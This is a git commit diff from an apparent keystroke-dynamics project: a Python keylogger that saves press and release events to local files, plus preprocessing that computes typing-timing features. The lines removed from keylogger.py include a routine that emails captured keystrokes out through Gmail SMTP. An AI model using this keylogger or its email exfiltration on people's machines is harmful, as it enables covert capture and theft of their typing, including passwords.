5c3e98017b37b7e7a2b6cd44396760fd64f674e6
Alexandre Bremard <bremard.alexandre@gmail.com>
2021-11-29 11:03:05 +0100

    keylogger and preprocess comment + cleanup

--- keylogger.py
+++ keylogger.py
@@ -1,5 +1,4 @@
 import keyboard  # for keylogs
-import smtplib  # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
@@ -9,17 +8,20 @@ from pathlib import Path
 
 SEND_REPORT_EVERY = 10 # in seconds, 60 means 1 minute and so on
 INTERRUPT_AFTER = 300 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
-EMAIL_PASSWORD = "thisisafakepassword"
 
 start_time = time.time()
 
-
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+
+    """
+        This script is a keylogger that collects keyboard press events and release events seperately into time-interval-segmented .txt files.
+        The reason we record press and realease events seperately is because when running the script, we can only open one listener thread.
+        This script should not be run directly, instead run start.bat which will call this script into 2 separate threads.
+    """
+
+    def __init__(self, interval):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
-        self.report_method = report_method
         # this is the string variable that contains the log of all
         # the keystrokes within `self.interval`
         self.log = ""
@@ -29,8 +31,8 @@ class Keylogger:
 
     def callback(self, event):
         """
-        This callback is invoked whenever a keyboard event is occured
-        (i.e when a key is released in this example)
+            This callback is invoked whenever a keyboard event is occured
+            (i.e when a key is released in this example)
         """
         name = event.name
         ts = time.time()
@@ -57,48 +59,36 @@ class Keylogger:
             sys.exit()
 
     def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[
-            :-7].replace(" ", "-").replace(":", "")
+        """
+            This method constructs the filename to be identified by start & end datetimes
+        """
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
         Path(f"./logs/{sys.argv[2]}/{sys.argv[1]}").mkdir(parents=True, exist_ok=True)
         self.filename = f"./logs/{sys.argv[2]}/{sys.argv[1]}/keylog-{start_dt_str}_{end_dt_str}"
 
     def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
+        """
+            This method creates a log file in the current directory that contains
+            the current keylogs in the `self.log` variable
+        """
         # open the file in write mode (create it)
         with open(f"{self.filename}.txt", "w") as f:
             # write the keylogs to the file
             print(self.log, file=f)
         print(f"[+] Saved {self.filename}.txt")
 
-    def sendmail(self, email, password, message):
-        # manages a connection to the SMTP server
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-        # connect to the SMTP server as TLS mode ( for security )
-        server.starttls()
-        # login to the email account
-        server.login(email, password)
-        # send the actual message
-        server.sendmail(email, email, message)
-        # terminates the session
-        server.quit()
-
     def report(self):
         """
-        This function gets called every `self.interval`
-        It basically sends keylogs and resets `self.log` variable
+            This function gets called every `self.interval`
+            It basically sends keylogs and resets `self.log` variable
         """
         if self.log:
             # if there is something in log, report it
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
+            self.report_to_file()
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
@@ -125,9 +115,5 @@ class Keylogger:
 
 
 if __name__ == "__main__":
-    # if you want a keylogger to send to your email
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file
-    # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
--- preprocess.py
+++ preprocess.py
@@ -9,21 +9,32 @@ from sklearn.neighbors import KNeighborsClassifier
 
 
 def preprocess(user=None):
-    press_files = glob.glob(f"logs/{user}/press/*.txt")
-    press_rows = []
+    """
+        This script will pre-process the raw data collected by the keylogger.py script, the steps are as follows:
+        1) parse each press and release .txt files by reading the events sequentially
+        2) map each released event to its pressed event
+        3) extract features such as "press_press_time", "press_release_time", "release_release_time"
+        4) run some statistics that describe the behavior of the user
+    """
 
+    # Collect .txt keylogs paths
+    press_files = glob.glob(f"logs/{user}/press/*.txt")
     release_files = glob.glob(f"logs/{user}/release/*.txt")
+    # Initialize array to concatenate press and release events
+    press_rows = []
     release_rows = []
 
+    # Parse press keylogs
     for press_file in press_files:
         with open(press_file) as fp:
             line = fp.readline()
             while line:
+                # Handle linebreak exception 
                 if line == "\n":
                     line = fp.readline()
                     continue
-                timestamp = datetime.strptime(
-                    line.strip().split(" - ")[0], '%Y-%m-%d %H:%M:%S %f')
+                # extract event's timestamp and key
+                timestamp = datetime.strptime(line.strip().split(" - ")[0], '%Y-%m-%d %H:%M:%S %f')
                 key = line.strip().split(" - ")[1].lower()
                 press_rows.append({
                     "timestamp": timestamp,
@@ -31,15 +42,17 @@ def preprocess(user=None):
                 })
                 line = fp.readline()
 
+    # Parse release keylogs
     for release_file in release_files:
         with open(release_file) as fp:
             line = fp.readline()
             while line:
+                # Handle linebreak exception 
                 if line == "\n":
                     line = fp.readline()
                     continue
-                timestamp = datetime.strptime(
-                    line.strip().split(" - ")[0], '%Y-%m-%d %H:%M:%S %f')
+                # extract event's timestamp and key
+                timestamp = datetime.strptime(line.strip().split(" - ")[0], '%Y-%m-%d %H:%M:%S %f')
                 key = line.strip().split(" - ")[1].lower()
                 release_rows.append({
                     "timestamp": timestamp,
@@ -47,23 +60,31 @@ def preprocess(user=None):
                 })
                 line = fp.readline()
 
+    # Convert arrays to dataframes for easier manipulation
     press_df = pd.DataFrame(press_rows)
     release_df = pd.DataFrame(release_rows)
 
+    # Optional : debug press/release dataframes
     press_df.to_csv("press_df.csv", date_format="%Y-%m-%d %H:%M:%S %f")
     release_df.to_csv("release_df.csv", date_format="%Y-%m-%d %H:%M:%S %f")
 
-    # Map release -> press and build dataset
+    # Map release events to their corresponding press event
     dataset_rows = []
+    # The mapping will be done key by key.
+    # For example we will map all "[SPACE]" keys together before mapping "e" keys
     for _, row in release_df.drop_duplicates(subset=['key']).iterrows():
+        # sub_df contains all release events recorded for key {row['key']}
         sub_df = release_df[release_df["key"] == row['key']]
+        # lower_bound is a time-cursor that records the last known release event timestamp
         lower_bound = None
         for sub_id, sub_row in sub_df.reset_index().iterrows():
             try:
+                # higher_bound runs through the latest release event timestamp
                 higher_bound = sub_row["timestamp"]
                 if sub_id == 0:
-                    press_time = press_df[(press_df["key"] == sub_row["key"]) & (
-                        press_df["timestamp"] < higher_bound)].iloc[0]["timestamp"]
+                    # match the release event to the press event
+                    # when a user holds a key for a long amount of time, the keylogger will records multiple press events, so we will keep only the first press event timestamp
+                    press_time = press_df[(press_df["key"] == sub_row["key"]) & (press_df["timestamp"] < higher_bound)].iloc[0]["timestamp"]
                 else:
                     press_time = press_df[(press_df["key"] == sub_row["key"]) & (press_df["timestamp"] < higher_bound) & (press_df["timestamp"] > lower_bound)].iloc[0]["timestamp"]
                 lower_bound = higher_bound
@@ -77,23 +98,26 @@ def preprocess(user=None):
                 continue
 
     dataset = pd.DataFrame(dataset_rows).sort_values(['pressed'])
-    dataset.to_csv("tmp_dataset.csv", date_format="%Y-%m-%d %H:%M:%S %f")
 
-    dataset["hold_time"] = (dataset["released"] -
-                            dataset["pressed"]) / pd.Timedelta(microseconds=1)
+    # Features extraction
+
+    # Hold time is computed on the whole columns rather than row by row
+    dataset["hold_time"] = (dataset["released"] - dataset["pressed"]) / pd.Timedelta(microseconds=1)
+
+    # press_press_time, press_release_time, release_release_time are computed row by row
     press_press_time = []
     press_release_time = []
     release_release_time = []
 
     for index, row in dataset.reset_index().iterrows():
-        press_press_delta = (dataset.iloc[index+1]["pressed"] -
-                             dataset.iloc[index]["pressed"]) / pd.Timedelta(microseconds=1)
+        # press_press_time is the time between 2 consecutive press events
+        press_press_delta = (dataset.iloc[index+1]["pressed"] - dataset.iloc[index]["pressed"]) / pd.Timedelta(microseconds=1)
         press_press_time.append(press_press_delta)
-        release_release_delta = (
-            dataset.iloc[index+1]["released"] - dataset.iloc[index]["released"]) / pd.Timedelta(microseconds=1)
+        # release_release_time is the time between 2 consecutive release events
+        release_release_delta = (dataset.iloc[index+1]["released"] - dataset.iloc[index]["released"]) / pd.Timedelta(microseconds=1)
         release_release_time.append(release_release_delta)
-        press_release_delta = (
-            dataset.iloc[index+1]["pressed"] - dataset.iloc[index]["released"]) / pd.Timedelta(microseconds=1)
+        # press_release_time is the time between the previous release event and the current press event
+        press_release_delta = (dataset.iloc[index+1]["pressed"] - dataset.iloc[index]["released"]) / pd.Timedelta(microseconds=1)
         press_release_time.append(press_release_delta)
 
         if index == len(dataset) - 2:
@@ -102,20 +126,18 @@ def preprocess(user=None):
             release_release_time.append(0)
             break
 
+    # Add features to final dataset
     dataset["press_press_time"] = press_press_time
     dataset["press_release_time"] = press_release_time
     dataset["release_release_time"] = release_release_time
 
-    # Analyse statistique
+    # Run some user-based statistics
     average_hold_time = dataset["hold_time"].mean()
-    average_press_press_time = dataset.iloc[:len(
-        dataset)-1]["press_press_time"].mean()
-    average_press_release_time = dataset.iloc[:len(
-        dataset)-1]["press_release_time"].mean()
-    average_release_release_time = dataset.iloc[:len(
-        dataset)-1]["release_release_time"].mean()
-    apm = len(dataset) * 60 * math.pow(10, 6) / ((dataset.iloc[len(
-        dataset)-1]["pressed"] - dataset.iloc[0]["pressed"]) / pd.Timedelta(microseconds=1))
+    average_press_press_time = dataset.iloc[:len(dataset)-1]["press_press_time"].mean()
+    average_press_release_time = dataset.iloc[:len(dataset)-1]["press_release_time"].mean()
+    average_release_release_time = dataset.iloc[:len(dataset)-1]["release_release_time"].mean()
+    # User's action per minute
+    apm = len(dataset) * 60 * math.pow(10, 6) / ((dataset.iloc[len(dataset)-1]["pressed"] - dataset.iloc[0]["pressed"]) / pd.Timedelta(microseconds=1))
 
     print("average_hold_time", average_hold_time)
     print("average_press_press_time", average_press_press_time)
@@ -123,6 +145,7 @@ def preprocess(user=None):
     print("average_release_release_time", average_release_release_time)
     print("apm", apm)
 
+    # Save dataset as a .csv file that will be used for Data Mining
     dataset[:-1].to_csv("dataset.csv", index=False)
 
     return dataset
